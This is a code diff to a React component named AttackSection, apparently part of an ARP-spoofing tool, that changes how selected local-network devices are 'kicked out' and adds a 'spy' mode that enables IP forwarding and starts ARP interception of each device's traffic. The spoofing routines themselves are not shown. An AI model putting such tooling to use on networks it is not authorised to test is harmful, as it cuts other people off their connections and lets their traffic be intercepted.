@@ -32,11 +32,10 @@ let AttackSection = ({
       if (discover.hasDevicesDiscoveryDone()) {
         switch (selection) {
           case "0":
-            const gatewayMAC = discover.getMAC(discover.gatewayIP());
-            console.log(selectedDevices);
+            console.log(discover.gwMAC);
             selectedDevices.forEach((ip) => {
               console.log("INFO: start kickingout " + ip);
-              arp.kickoutStart(ip, gatewayMAC);
+              arp.kickoutStart(ip, discover.gwMAC);
             });
             break;
           case "1":
@@ -45,6 +44,10 @@ let AttackSection = ({
             break;
           case "2":
             if (!permission.getEnableStatus()) permission.enableIPForwarding();
+            selectedDevices.forEach((ip) => {
+              console.log("INFO: start spying on " + ip);
+              arp.spyStart(ip, discover.devices.get(ip), discover.gwMAC);
+            });
             break;
           default:
             break;
@@ -59,13 +62,15 @@ let AttackSection = ({
       changeAttackStateHandler("stop");
       switch (selection) {
         case "0":
-          arp.kickoutHardStop();
+          arp.attackHardStop();
           break;
         case "1":
           if (permission.getEnableStatus()) permission.disableIPForwarding();
+          arp.attackHardStop();
           break;
         case "2":
           if (permission.getEnableStatus()) permission.disableIPForwarding();
+          arp.attackHardStop();
           break;
         default:
           break;
@@ -75,7 +80,7 @@ let AttackSection = ({
   );
 
   const refreshHandler = React.useCallback(() => {
-    discover.clearDevicesMap();
+    discover.clearDevices();
     discover.scan();
     changeAttackStateHandler("scan");
     let interval = setInterval(() => {
